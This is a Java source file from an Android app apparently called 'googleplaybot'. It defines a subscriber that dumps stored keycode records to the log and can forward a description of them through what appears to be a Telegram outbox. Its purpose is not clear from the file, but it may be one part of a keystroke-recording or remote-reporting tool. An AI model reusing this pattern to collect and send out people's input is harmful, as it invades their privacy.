package com.googleplaybot.data.subscribers;

import android.support.annotation.Nullable;

import com.googleplaybot.events.services.KeycodesEvent;
import com.googleplaybot.events.remote.telegram.OutboxEvent;
import com.googleplaybot.models.Keycode;
import com.googleplaybot.utils.LogUtil;
import com.googleplaybot.utils.EventUtil;

import java.util.List;

import timber.log.Timber;

public class SelectRecordSubscriber extends BaseRecordSubscriber<List<Keycode>> {

    private String firstParameter;

    @Nullable
    private String secondParameter;

    private boolean postEvent;

    public SelectRecordSubscriber(int record, String firstParameter, @Nullable String secondParameter,
                                  boolean postEvent, boolean sendTelegram) {
        super(record, sendTelegram);
        this.firstParameter = firstParameter;
        this.secondParameter = secondParameter;
        this.postEvent = postEvent;
    }

    @Override
    public void onCompleted() {}

    @Override
    public void onError(Throwable e) {
        LogUtil.e(getClass(), e.getMessage());
    }

    @Override
    public void onNext(List<Keycode> keycodes) {
        Timber.d("> DUMP KEYS START <");
        for (Keycode keycode : keycodes) {
            Timber.d(keycode.toString());
        }
        Timber.d("> DUMP KEYS END <");
        String description = Keycode.describeRecord(record, keycodes);
        if (postEvent) {
            EventUtil.post(new KeycodesEvent(record, keycodes, firstParameter, secondParameter));
        } else {
            LogUtil.print(description);
        }
        if (sendTelegram) {
            EventUtil.post(new OutboxEvent(description));
        }
    }
}